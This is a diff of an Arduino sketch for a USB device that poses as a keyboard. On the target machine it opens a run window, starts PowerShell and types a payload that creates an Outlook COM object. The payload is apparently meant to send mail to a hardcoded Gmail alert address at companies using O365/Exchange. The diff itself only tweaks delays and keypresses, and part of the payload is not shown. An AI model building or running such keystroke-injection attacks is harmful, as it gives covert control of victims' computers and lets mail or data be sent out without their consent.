@@ -5,13 +5,12 @@
 #define ALERT_MAIL "\"ulysse31@gmail.com\""
 
 void setup() {
-  // Nothing to do here (at least for now ... ^^')
+  // Some delay is needed just to be sure that usb keyboard gets enabled on Operating system
+  delay(1200);
 }
 
 void loop()
 {
-  // some delay is needed just to be sure that usb keyboard gets enabled on Operating system
-  delay(1500);
   // Keyboard library start
   Keyboard.begin();
   // Launch an execute command window
@@ -24,7 +23,7 @@ void loop()
   Keyboard.print("powershell.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  delay(100);
+  delay(200);
   //
   // Powershell payload HERE: sample payload about works great on Microsoft Enabled O365 / Exchange Companies
   Keyboard.print("$Outlook = New-Object -ComObject Outlook.Application");
@@ -60,8 +59,6 @@ void loop()
   delay(10);
   // End Powershell payload
   //
-  Keyboard.press(KEY_RETURN);
-  Keyboard.release(KEY_RETURN);
   Keyboard.print("exit");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
